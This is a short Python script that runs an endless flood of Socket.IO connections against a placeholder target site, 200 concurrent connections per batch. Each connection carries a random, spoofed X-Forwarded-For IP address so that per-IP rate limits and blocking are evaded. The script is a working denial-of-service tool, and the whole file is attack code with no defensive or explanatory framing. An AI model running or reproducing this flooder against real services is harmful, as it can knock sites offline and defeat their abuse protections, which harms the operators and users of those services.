import socketio
import asyncio
import random

class botter:
  def __init__(self):
    self.total = 0
    self.site = "Your site"
    
  async def connect(self):
    try:
      ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
      await socketio.AsyncClient().connect(self.site, headers={"X-Forwarded-For": (ip)})
      self.total += 1
    except Exception as e: print(e, self.total)


  async def start(self):
    while True:
      tasks = []
      for i in range(200):
        tasks.append(asyncio.create_task(self.connect()))

      await asyncio.gather(*tasks)
  
asyncio.run(botter().start())
